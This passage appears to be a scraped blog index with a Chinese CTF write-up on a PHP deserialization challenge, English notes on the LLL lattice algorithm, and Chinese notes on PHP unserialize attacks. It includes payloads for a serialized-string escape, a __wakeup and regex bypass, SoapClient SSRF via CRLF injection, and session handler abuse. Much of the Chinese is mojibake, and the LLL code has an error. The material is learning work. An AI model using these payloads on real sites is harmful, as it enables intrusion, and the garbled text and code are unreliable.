å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚ ä¹Ÿå°±æ˜¯è¯´å‚æ•°æ˜¯ä¸ªæ•°ç»„, å¹¶ä¸”æ ¹æ®é”®å¯¹å€¼æ¥åˆ›é€ å˜é‡, è€Œä¸”å¯ä»¥è¦†ç›–å‰é¢çš„å˜é‡, è¿™æ ·å°±å¯ä»¥é€ æˆå˜é‡è¦†ç›–äº† payload æ„é€  å­—ç¬¦é€ƒé€¸çš„æ„é€ ä¹Ÿæ€»ç»“å¾ˆå¤šæ¬¡äº†, è¿™æ¬¡å°±ç®€å•çš„è¯´ä¸€ä¸‹ è¿™é¢˜ä¸»è¦å°±æ˜¯æ„é€ å­—ç¬¦é€ƒé€¸çš„payload, æˆ‘ä»¬éœ€è¦æœ€å&quot;img&quot; =&gt; base64encode(&quot;d0g3_f1ag.php&quot;)è€å¥—è·¯, å…ˆæ„é€ ä¸€ä¸ª 123456$_SESSION[&quot;user&quot;] = 'guest';$_SESSION['function'] = $_GET['f'];$_SESSION['img'] = base64_encode('guest_img.png');$a = serialize($_SESSION);echo $a;# a:3:{s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;N;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;} å†æ…¢æ…¢å°è¯•é€šè¿‡å­—ç¬¦å‡å°‘æŠŠä¸€ä¸ªåŒå¼•å·é—­åˆ, æœ€åå¯ä»¥æ„é€ å‡ºpayload: 1?f[]=phpphpphpphp&amp;f[]=&quot;;i:1;s:1:&quot;1&quot;;}s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc= EXPGETæ–¹å¼ä¼ ?f[]=phpphpphpphp&amp;f[]=&quot;;i:1;s:1:&quot;1&quot;;}s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=POSTæ–¹å¼ä¼ function=show_image ä¸è¿‡ç»“æœå‘ç°flagå¹¶ä¸åœ¨d0g3_f1ag.phpä¸­,d0g3_f1ag.phpä¸­åªæœ‰ä¸€å¥ $flag = 'flag in /d0g3_fllllllag';é‚£å°±å†æ„é€ ä¸€æ¬¡ ?f[]=phpphpphpphp&amp;f[]=&quot;;i:1;s:1:&quot;1&quot;;}s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn åˆ«å¿˜äº†POST, ç„¶åå°±èƒ½çœ‹åˆ°flagäº† åè®°åšå®Œé¢˜åç¿»äº†ä¸‹åˆ«çš„å¸ˆå‚…çš„wp, å‘ç°åˆ«çš„å¸ˆå‚…éƒ½æ˜¯GETä¼ f=show_image, POSTç›´æ¥å¯¹$_SESSION['user']å’Œ$_SESSION['function']åšæ–‡ç« , è¿™æ ·å°±ä¸éœ€è¦é€šè¿‡æ•°ç»„æ¥è¿›è¡Œå­—ç¬¦é€ƒé€¸äº†, è¿™ä¹Ÿæ˜¯ä¸€ç§æ€è·¯, è€Œä¸”å¯ä»¥æ§åˆ¶çš„å˜é‡æ›´å¤šäº†(æˆ‘è„‘å­æ€ä¹ˆå°±æ²¡è½¬è¿‡æ¥â€¦ ä¸è¿‡å› ä¸ºè„‘å­æ²¡è½¬è¿‡æ¥ä¹Ÿè§£é”äº†æ§åˆ¶ä¸€ä¸ªå˜é‡çš„æ—¶å€™, åˆ©ç”¨æ•°å­—æ¥è¿›è¡Œå­—ç¬¦å‡å°‘çš„å­—ç¬¦é€ƒé€¸!","link":"/2021/03/24/Noting-of-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/"},{"title":"Reading notes An Introduction to Lenstra-Lenstra-Lovasz Lattice Basis Reduction Algorithm","text":"IntroductionDefinition 1.1(Lattice). A lattice $\\mathcal L$ is a discrete subgroup of $H$ generated by all the integer combinations of the vectors of some basis $B$ :$$\\mathcal L = \\sum^m_{i=1}\\mathbb Zb_i = \\lbrace \\sum^m_{i=1}z_ib_i, where \\ z_i \\in \\mathbb Z,b_i \\in B \\rbrace .$$Theorem 1.1 (Minowskiâ€™s Theorem). Any convex, centrally symmetric body $S$ of volume $vol(S) &gt; 2^ndet(\\mathcal L)$ contains a non-zero lattice point. $det(\\mathcal L)$ is the determinant of a lattice $\\mathcal L$ . Definition 1.2 (Fundamental Region). A set $\\mathcal F \\subseteq \\mathbb R^n$ of a lattice $\\mathcal F$ if its translation $x+\\mathcal F = {x+y:y \\in \\mathcal F}$,taken over all $x \\in \\mathcal L$, form a partition of $\\mathbb R^n$. Corollary 1.1.1 For any n-dimensional lattice $\\mathcal L$, we have the length of shortest vector $\\lambda(\\mathcal L) &gt; \\sqrt n \\cdot det(\\mathcal L)^{1 \\over n}$ Basis Reductionâ€‹ Basis reduction is a process of reducing the basis $B$ of a lattice $\\mathcal L$ to a shorter basis $Bâ€™$ while keeping $\\mathcal L$ the same. â€‹ There are some ways to change the basis but keep the same lattice : 1. Swap two vectors in the basis. 2. For a vector $b_i \\in B $, use $-b_i$ instead. 3. For a vector $b_i \\in B$, add a linear combination of other basis vectors to it. Basis reduction can help solving SVP, because if we can not reduce a basis anymore, the shortest basis vector should be the shortest vector of the lattice. Now we start by solving the SVP in 2-dimensional case. Definition 2.1 (Two dimensional reduced basis). A basis $(b_1,b_2)$ is said to be reduced if it satisfies following condition:$$|| b_1 || \\leq || b_2 || \\\\u = {b_1 \\cdot b_2 \\over ||b_1||^2} \\leq {1\\over 2}$$with the $u$ is called the orthogonal projection coefficient. Theorem 2.1. Given a two dimensional lattice $\\mathcal L$ with basis rank 2, if $\\lambda$ is the length of the shortest vector in $\\mathcal L$, then$$\\lambda \\leq \\sqrt { {2 \\over \\sqrt3}det(\\mathcal L)}.$$Theorem 2.2 if a basis ${b_1,b_2}$ is reduced, then $b_1$ is the shortest vector. â€‹ About the Definition 2.1 and Theorem 2.1 , 2.2 , I think when we can say we find the shortest vector $b_1$, the basis $(b_1,b_2)$ is said â€œalready be reducedâ€. And it means that this basis satisfies the condition in the Definition 2.1.â€‹ So, if $u &gt; {1\\over 2}$, the basis can be reduced continued. The description of Gaussâ€™s algorithm solved SVP in 2-dimensional. Start with basis ${b_1,b_2}$, if $||b_1|| &gt; ||b_2||$. swap $b_1$ and $b_2$. Compute $u = {b_1 \\cdot b_2 \\over ||b_1||^2}.$If $u&gt;{1\\over 2}$. let $m$ be the biggest integer that is smaller than $u$, and let $b_2 = b_2 - mb_1.$ If $||b_1|| &gt; ||b_2||$, then swap $b_1$ and $b_2$, and repeat step 2. Otherwise, output $b_1$ According the algorithm above, I write the following script with the Sagemath. 1234567891011def Gauss_2d_reduce(basis): (b1,b2) = (basis[0],basis[1]) if basis[0].norm() &lt; basis[1].norm() else (basis[1],basis[0]) while True: u = (b1[0]*b2[0] + b1[1]*b2[1]) / b1.norm()^2 if u &gt; 0.5: m = int(u) b2 = b2 - m*b1 if b1.norm() &gt; b2.norm(): b1,b2 = b2,b1 else: return([b1,b2]) The basis we found in Gauss algorithm is not exactly orthogonal, but it is the nearest basis we can get. Gram-Schmidt OrthogonalizationTo generalize the algorithm to n-dimensions, we need to find a way to construct n-dimensional orthogonal basis based on the given basis, which leads us to Gram-Schmidt Orthogonalization. Theorem 3.1 (Gram-Schmidt Orthogonalization method). Given a basis $\\{b_1,b_2,\\cdots,b_m\\}$ of a subspace $H_m$ of $\\mathbb R^n$, we define$$b_1^* = b_1 \\\\b_2^*=b_2 - u_{1,2}b_1, \\ \\ \\ \\ \\ \\ u_{1,2} = {b_2 \\cdot b_1^* \\over b_1^* \\cdot b_1^*} \\\\\\vdots \\\\b_m^* = b_m - \\sum_{i&lt;m}u_{i,m}b_i \\ \\ \\ \\ \\ \\ u_{i,m} = {b_m \\cdot b_i^* \\over b_i^* \\cdot b_i^*} \\\\$$Then, $ \\{b_1^*,b_2^*,\\cdots,b_m^*\\} $ is an orthogonal basis of $H_m$. Based on this Theorem, if we set $u_{m,m} = 1$, then we have$$b_m = \\sum ^m_{i=1}u_{i,m}b_i$$Therefore, we can write the above formula in matrix form, $ B = B^*U $. where basis vectors are columns in $B$ and $B^*$. Thus, we have$$U = \\begin{pmatrix}u_{1,1}&amp;u_{1,2}&amp;\\cdots&amp;u_{1,n} \\\\0&amp;u_{2,2}&amp;\\cdots&amp;u_{2,n} \\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots \\\\0&amp;0&amp;0&amp;u_{n,n} \\\\\\end{pmatrix}=\\begin{pmatrix}1&amp;u_{1,2}&amp;\\cdots&amp;u_{1,n} \\\\0&amp;1&amp;\\cdots&amp;u_{2,n} \\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots \\\\0&amp;0&amp;0&amp;1 \\\\\\end{pmatrix}$$Obviously, we can know that $det(U) = 1$ For better understanding the matrix , letâ€™s write the matrix at length. but before write down the matrix, I want to translate the formula in the Theorem 3.1. $$(b_1,b_2,\\cdots,b_n)\\begin{pmatrix}1&amp;u_{1,2}&amp;\\cdots&amp;u_{1,n} \\\\0&amp;1&amp;\\cdots&amp;u_{2,n} \\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots \\\\0&amp;0&amp;0&amp;1 \\\\\\end{pmatrix} = (b_1^*,b_2^*,\\cdots,b_n^*)$$I canâ€™t understand! why $B = B^*U$ ????? LLL Basis ReductionDefinition 4.1 (LLL reduced basis). Let$\\{b_1,b_2,\\cdots,b_n\\}$ be a basis for a n-dimensional Lattice $\\mathcal L$ , and $\\{b_1^{âˆ—},b_2^{âˆ—},\\cdots,b_n^{âˆ—}\\}$ be the orthogonal basis generated in Theorem 3.1, and we have $u_{i,k}={b_k \\cdot b_i^{âˆ—} \\over b_i^{âˆ—} \\cdot b_i^{âˆ—}}$. We say $\\{b_1,b_2,\\cdots,b_n\\}$ is a LLL reduced basis if it satisfies two conditions: (1) $\\forall i \\ne k, u_{i,k} \\le {1\\over 2},$(2) For each $i, ||b_{i+1}^{âˆ—} + u_{i,i+1}b_i^{âˆ—}||^2 \\ge {3\\over 4}||b_i^{âˆ—}||^2$ Remark. The constant $3\\over 4$ is chosen for the simplicity of the paper. Any constant between $1\\over 4$ and 1 can guarantee that the algorithm terminates in polynomial time. Remark. The condition 2 emphasizes the ordering of the basis, like what we did in two dimensional case. Given a basis $\\{b_1,b_2,\\cdots,b_n\\}$ in n-dimension, to get a LLL reduced basis, the LLL algorithm works as below. Step 1: Computed the most orthogonal basis based on Gram-Schmidt orthogonalization. Step 2: Check the second condition. Because I donâ€™t know how to choose the constant, I run the LLL Algorithm four times with different constants for one output. 1234567891011121314151617181920212223242526272829303132333435def LLL_Algorithm(Lattice,constant=1/4): n = len(Lattice[0]) quickSort(Lattice,0,n-1) while True: finish = True for i in range(1,n+1): for k in range(1,i): m = int((Lattice[i-1]*Lattice[k-1]) / (Lattice[k-1] * Lattice[k-1])) Lattice[i-1] = Lattice[i-1] - m * Lattice[k-1] for i in range(n-1): u = (Lattice[i+1]*Lattice[i]) / (Lattice[i] * Lattice[i]) if ((Lattice[i+1]+u*Lattice[i]).norm())^2 &lt; ((constant) * (Lattice[i].norm())^2): Lattice[i],Lattice[i+1] = Lattice[i+1],Lattice[i] finish = False break if finish: if contant == 1: return Lattice else: return LLL_Algorithm(Lattice,constant+(1/4))def partition(Lattice, low, high): i = (low - 1) pivot = Lattice[high].norm() for j in range(low, high): if Lattice[j].norm() &lt;= pivot: i = i + 1 Lattice[i], Lattice[j] = Lattice[j], Lattice[i] Lattice[i + 1], Lattice[high] = Lattice[high], Lattice[i + 1] return (i + 1) def quickSort(Lattice, low, high): if low &lt; high: pi = partition(Lattice, low, high) quickSort(Lattice, low, pi - 1) quickSort(Lattice, pi + 1, high) Claim 4.1. If $\\{b_1,b_2,\\cdots,b_n\\}$ is a n-dimensional LLL reduced basis of Lattice $\\mathcal L$, then $||b_1|| \\le 2^{n-1 \\over 2 }\\lambda(\\mathcal L)$ is the length of the shortest vector of $\\mathcal L$. In this paper, the author proof the LLL algorithm terminates in polynomial time of $n$ in the next part. If you want to know how to proof that, you can read the original paper. Conclusion I think this paper make me understand the LLL Algorithm easily, but I want to know more detail about the LLL Algorithm. If I have time, I would like to see the original paper about LLL! -&gt; https://link.springer.com/content/pdf/10.1007/BF01457454.pdf","link":"/2021/03/25/Reading-notes-An-Introduction-to-Lenstra-Lenstra-Lovasz-Lattice-Basis-Reduction-Algorithm/"},{"title":"The learning of php unserialize","text":"æ¦‚è¿°å½“unserialize()çš„å‚æ•°å¯æ§æ—¶, å¯ä»¥ä¼ å…¥ä¸€ä¸ªæ„é€ å¥½çš„åºåˆ—ä¸²æ§åˆ¶ç±»å†…éƒ¨çš„å˜é‡ç”šè‡³å‡½æ•°, å¦‚æœç±»å†…éƒ¨å­˜åœ¨æ¯”è¾ƒå±é™©çš„å‡½æ•°include() eval()ç­‰ç­‰, å°†ä¼šé€ æˆä¸¥é‡åæœ å¦‚ä½•åˆ©ç”¨å½“æœåŠ¡ç«¯ä»£ç ä¸­å­˜åœ¨æŸä¸ªç±»çš„æ—¶å€™, å¯ä»¥é€šè¿‡unserialize()åˆ›å»ºä¸€ä¸ªè¯¥ç±»çš„å¯¹è±¡, è€Œæˆ‘ä»¬å¯æ§çš„å°±æ˜¯ç±»ä¸­çš„å±æ€§, è¿˜å¯ä»¥åˆ©ç”¨ä¸€äº›æŠ€å·§å»ç»•è¿‡ä¸€äº›é­”æœ¯æ–¹æ³•æˆ–è€…æ˜¯åˆ©ç”¨ä¸€äº›é­”æœ¯æ–¹æ³•. é€šè¿‡æ§åˆ¶é­”æœ¯æ–¹æ³•å’Œå±æ€§è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„æ”»å‡»æ•ˆæœ. ä¸€èˆ¬æµç¨‹ å¯»æ‰¾å‚æ•°å¯æ§çš„unserialize() å¯»æ‰¾å¯ä»¥ç”¨äºå‘½ä»¤æ‰§è¡Œ, æ–‡ä»¶åŒ…å«ç­‰ç­‰çš„å‡½æ•°åœ¨å±é™©ç±» æ‰¾åˆ°ä¸€ä¸ªæ§åˆ¶é“¾æ§åˆ¶å±é™©ç±»ä¸­çš„å±é™©å‡½æ•° é­”æœ¯æ–¹æ³•1234567891011__wakeup() //æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°__sleep() //æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ–¹æ³•__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke() //å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ éœ€è¦æ³¨æ„çš„æ˜¯, __toString()è¿™ä¸ªæ–¹æ³•è§¦å‘çš„æ–¹å¼æ¯”è¾ƒå¤š: echo ($obj) / print($obj) æ‰“å°æ—¶ä¼šè§¦å‘ ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶ ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶ ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ==æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ==æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰ ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶ ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶ åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨ ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™ å…³äºç»•è¿‡çš„Trickç»•è¿‡__wake() ç‰ˆæœ¬:php 5&lt; 5.6.25php 7&gt; 7.0.10 åˆ©ç”¨æ–¹æ³•:å½“åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å±æ€§ä¸ªæ•°å¤§äºç±»ä¸­å®é™…çš„å±æ€§ä¸ªæ•°æ—¶, å°±ä¼šè·³è¿‡__wake()å‡½æ•° ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ åŠ å·ç»•è¿‡, åœ¨ååºåˆ—åŒ–çš„æ—¶å€™, æ•°å­—å‰é¢çš„åŠ å·ä¼šè¢«å½“æˆæ˜¯æ­£å·è€Œæ­£åˆ™åŒ¹é…çš„æ—¶å€™åˆ™ä¸ä¼šè¿™æ ·è¯†åˆ« æ¯”å¦‚è¯´O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;abc&quot;;}, æœ‰æ—¶å€™é¢˜ç›®ä¼šé€šè¿‡æ­£åˆ™O\\:\\dæ¥åŒ¹é…O:4, è¿™æ—¶å°†åºåˆ—æ”¹æˆO:+4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;abc&quot;;}å°±èƒ½ç»•è¿‡è¯¥åŒ¹é… å˜é‡å¼•ç”¨åˆ©ç”¨å˜é‡å¼•ç”¨ä½¿å¾—ç±»ä¸­ä¸¤ä¸ªå˜é‡å§‹ç»ˆç›¸ç­‰ phpåŸç”Ÿç±»ååºåˆ—åŒ–SoapClientååºåˆ—åŒ–åˆ©ç”¨æ¦‚è¿°phpå®‰è£…php-soapæ‰©å±•ä¹‹å, å¯ä»¥ååºåˆ—åŒ–åŸç”Ÿç±»SoapClient, æ¥å‘é€http postè¯·æ±‚æ¥å®ç°SSRFé€šè¿‡ååºåˆ—åŒ–SoapClientå¯¹è±¡åè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•è§¦å‘__call()æ–¹æ³•è¿™ä¸ª__call()æ–¹æ³•ä¼šå‘æŒ‡å®šURLå‘é€HTTP POSTè¯·æ±‚, å› ä¸ºUser-Agentå­—æ®µå¯æ§, æ‰€ä»¥å¯ä»¥é€šè¿‡CRLFæ¥æ„é€ è¯·æ±‚å¤´å®ç°è‡ªå®šä¹‰POST DATA å¦‚æœè¦åœ¨è‡ªå·±çš„ç¯å¢ƒå¤ç°åˆ™éœ€è¦æ›´æ”¹php.iniä¸­çš„extension=soap åˆ©ç”¨æ–¹æ³•ä¸¾ä¸ªæ —å­ 1234567&lt;?php $target = &quot;http://127.0.0.1/test.php&quot;; $ua = &quot;kirito-zbds&quot;; $a = new SoapClient(NULL,array('location'=&gt;$target,'uri'=&gt;'k1rit0','user_agent'=&gt;$ua)); $b = serialize($a); $c = unserialize($b); $c -&gt; tan90_function(); å½“SoapClientå¯¹è±¡è¢«é€†åºåˆ—åŒ–å‡ºæ¥å¹¶è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„tan90_function()æ–¹æ³•æ—¶.__call()æ–¹æ³•ä¼šå‘locationä¹Ÿå°±æ˜¯http://127.0.0.1/test.phpå‘é€ä¸€ä¸ªHTTP POSTè¯·æ±‚, è€Œè¯·æ±‚å¤´ä¸­ä¼šæœ‰: 12User-Agent: kirito-zbdsSOAPAction: k1rit0#tan90_function() // uri + è¢«è°ƒç”¨çš„ä¸å­˜åœ¨çš„å‡½æ•°å å¯ä»¥çœ‹åˆ°, è¯·æ±‚å¤´ä¸­çš„è¿™äº›å­—æ®µä¼šå˜æˆå¯æ§çš„, ä½†è¿™æ ·åªèƒ½é€šè¿‡å†…ç½‘è®¿é—®test.php, å¹¶ä¸èƒ½ä»»æ„POSTæ•°æ®. è¦æƒ³POSTæ•°æ®, å°±è¦ç”¨åˆ°CRLFäº†. ä»€ä¹ˆæ˜¯CRLFCRLFå°±æ˜¯\\r\\nçš„ç¼©å†™, HTTPåè®®ä¸­headerä¹‹é—´æ˜¯ç”¨ä¸€ä¸ª\\r\\næ¥åˆ†éš”çš„, è€ŒHTTP headerå’ŒHTTP bodyä¹‹é—´æ˜¯ç”¨\\r\\n\\r\\nä¹Ÿå°±æ˜¯ä¸¤ä¸ª\\r\\næ¥åˆ†å‰²çš„. å¦‚æœè¯·æ±‚å¤´ä¸­çš„å­—æ®µå¯æ§, é‚£ä¹ˆå¯ä»¥æ‰‹åŠ¨æ·»åŠ \\r\\nç”¨ä»¥åœ¨è¯·æ±‚ä¸­æ·»åŠ å­—æ®µç”šè‡³æ˜¯æ·»åŠ HTTP bodyç”¨ä»¥POST data. æ¯”å¦‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­, æˆ‘ä»¬æŠŠ$uaæ”¹ä¸º 1$ua = &quot;kirito-zbds\\r\\nContent-Type:application-www-form-urlencoded\\r\\nContent-Length:17\\r\\n\\r\\ndata=this_is_data&quot; é‚£ä¹ˆHTTP POSTçš„è¯·æ±‚å¤´ä¸­å°±ä¼šå‡ºç°è¿™ä¹ˆä¸€ä¸² 123456User-Agent: kirito-zbdsContent-Type: application-www-form-urlencodedContent-Length: 17data=this_is_dataSOAPAction: k1rit0#tan90_function() è¿™æ ·å°±æˆåŠŸä¼ªé€ å‡ºHTTP POSTè¯·æ±‚å¹¶ä¼ è¾“å‚æ•°äº† php-sessionååºåˆ—åŒ–åˆæ˜¯session, ä¸Šæ¬¡åœ¨æ–‡ä»¶åŒ…å«ä¹Ÿæœ‰session, å…¶å®è¿™é‡Œçš„ååºåˆ—åŒ–ä¹Ÿè¦ç”¨åˆ°é‚£è¾¹çš„çŸ¥è¯† æ¦‚è¿°å…³äºsession.upload_progressè¿™ä¸ªphp-sessionååºåˆ—åŒ–å…¶å®è·Ÿsession.uplaod_progressæœ‰å…³, è¯¦ç»†çš„å¯ä»¥çœ‹æ–‡ä»¶åŒ…å«é‚£éƒ¨åˆ†çš„ç¬”è®°è¿™é‡Œåªç®€å•çš„è¯´ä¸€ä¸‹, æœåŠ¡ç«¯çš„php.inié»˜è®¤é…ç½®session.use_strict_mode = 0, è¿™æ ·ç”¨æˆ·å¯ä»¥è‡ªå·±è®¾ç½®Cookies: PHPSESSID = xxxxxx, æœåŠ¡ç«¯å°†ä¼šåˆ›å»ºä¸€ä¸ª/tmp/sess_xxxxxxæ–‡ä»¶ å¹¶ä¸”, å¦‚æœç”¨æˆ·å‘æœåŠ¡ç«¯ä¼ é€æ–‡ä»¶, é‚£ä¹ˆæœåŠ¡ç«¯å°†ä¼šåœ¨/tmp/sess_xxxxxxä¸­å†™å…¥ä¸Šä¼ è¿›åº¦, æœ€é‡è¦çš„æ˜¯. å¦‚æœç”¨æˆ·çš„POST DATAä¸­å«æœ‰PHP_SESSION_UPLOAD_PROGRESS=xxx, é‚£ä¹ˆæœåŠ¡ç«¯å°†ä¼šåœ¨/tmp/sess_xxxxxxä¸­å†™å…¥ 1upload_progress_xxx | ä¸Šä¼ è¿›åº¦ å…³äºsession.serialize_handleråœ¨æ‰§è¡Œphpä»£ç æ—¶å¯ä»¥è®¾ç½®è¿™ä¹ˆä¸¤ä¸ªä¸œè¥¿ 12ini_set('session.serialize_handler','php_serialize');ini_set('session.serialize_handler','php'); è¿™é‡Œè®¾ç½®çš„æ˜¯phpå¤„ç†sessionçš„æ–¹å¼,phpæˆ–php_serialize. é»˜è®¤æ˜¯phpè¿™ä¸¤ä¸ªæ–¹å¼çš„ä¸åŒå°±åœ¨äº, å­˜å–sessionæ–‡ä»¶çš„æ ¼å¼ä¸åŒ.ä¸‹é¢ä»ä¸€ä¸ªä¾‹å­æ¥è¯¦ç»†çš„çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªæ–¹å¼çš„åŒºåˆ« 123456&lt;?phpini_set('session.serialize_handler', 'php');// ini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['k1rit0'] = $_GET['a'];var_dump($_SESSION); phpæ–¹å¼çš„å­˜å–çš„æ ¼å¼æ˜¯:é”®å|serialize_string, å½“æˆ‘ä¼ ?a=a:2:{s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;}sessionæ–‡ä»¶ä¸­å­˜çš„æ˜¯k1rit0|s:45:&quot;a:2:{s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;}&quot;; è€Œå¦‚æœç”¨çš„æ˜¯php_serializeæ–¹å¼,å­˜å–çš„æ ¼å¼å°±æ˜¯serialize_string, sessionæ–‡ä»¶ä¸­å­˜çš„ä¾¿æ˜¯a:1:{s:6:&quot;k1rit0&quot;;s:45:&quot;a:2:{s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;}&quot;;} åˆ©ç”¨æ–¹æ³•æ ¹æ®ä¸Šé¢çš„ä¸¤ä¸ªsessionå­˜å–æ–¹æ³•, å¦‚æœæˆ‘ä»¬å…ˆä»¥php_serializeå‚¨å­˜ å†æŒ‰phpçš„æ–¹å¼è¯»å–, å°±å¯ä»¥ååºåˆ—åŒ–ä¸€äº›æ¶æ„çš„åºåˆ—. å°±æ‹¿ä¸Šé¢çš„ä¾‹å­æ¥è¯´, å…ˆä»¥php_serializeå‚¨å­˜?a=|a:2:{s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;},æ³¨æ„é‚£ä¸ª| è¿™ä¸ªæ—¶å€™æ¥çœ‹çœ‹sessioné‡Œæ˜¯å•¥ 1a:1:{s:6:&quot;k1rit0&quot;;s:46:&quot;|a:2:{s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;}&quot;;} å¦‚æœè¿™ä¸ªæ—¶å€™, æŒ‰phpçš„æ–¹å¼è¯»å–è¿™ä¸ªsessionæ–‡ä»¶, å°±ä¼šè¢«è¯†åˆ«æˆä¸¤éƒ¨åˆ†: |å‰é¢çš„a:1:{s:6:&quot;k1rit0&quot;;s:46:&quot; |åé¢çš„a:2:{s:4:&quot;name&quot;;s:6:&quot;kirito&quot;;s:3:&quot;age&quot;;i:14;}&quot;;} |åé¢çš„å‰ä¸€éƒ¨åˆ†``a:2:{s:4:â€nameâ€;s:6:â€kiritoâ€;s:3:â€ageâ€;i:14;}`, ä¼šè¢«è¯†åˆ«æˆä¸€ä¸ªå®Œæ•´çš„åºåˆ—åŒ–ä¸² è¿™é‡Œæœ‰ä¸ªsession_start()çš„å°çŸ¥è¯†, å¦‚æœphpä»£ç ä¸­å­˜åœ¨session_start()è€Œä¸”å¤„ç†sessionçš„æ–¹å¼æ˜¯php, é‚£ä¹ˆåœ¨æ‰§è¡Œsession_start()æ—¶ä¼šååºåˆ—åŒ–sessionä¸­|åçš„åºåˆ—åŒ–ä¸², å¹¶èµ‹å€¼ç»™$_SESSIONå˜é‡ å¦‚æœphpä»£ç ä¸­æŸäº›ç±»ä¸­æœ‰__wake()æˆ–__destruct(), å¹¶ä¸”è¿™ä¸¤ä¸ªé­”æ³•å‡½æ•°ä¸­å­˜åœ¨å±é™©çš„å‡½æ•°, åˆ™å¯ä»¥é€šè¿‡sessionååºåˆ—åŒ–æ§åˆ¶è¿™äº›å±é™©å‡½æ•°. è‡³äºå¦‚ä½•åœ¨sessionæ–‡ä»¶ä¸­å†™å…¥æ¶æ„åºåˆ—åŒ–ä¸²å‘¢? é‚£å°±è¦ç”¨åˆ°session.upload_progressä¸­çš„PHP_SESSION_UPLOAD_PROGRESSäº†, å…·ä½“æ€ä¹ˆç”¨, å»çœ‹æ–‡ä»¶åŒ…å«é‚£ç¯‡ç¬”è®°å§ ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸å¦‚æœå­˜åœ¨å¯¹åºåˆ—åŒ–åçš„å­—ç¬¦è¿›è¡Œæ›¿æ¢, å¹¶ä¸”æ›¿æ¢åå­—ç¬¦é•¿åº¦ä¼šå˜, åˆ™æœ‰å¯èƒ½å­˜åœ¨å­—ç¬¦é€ƒé€¸ æ›¿æ¢åå­—ç¬¦å˜é•¿1234function change($str){ return str_replace(&quot;o&quot;, &quot;oo&quot;, $str);} æ¯”å¦‚è¯´ä¸Šé¢è¿™ä¸ªå‡½æ•°, 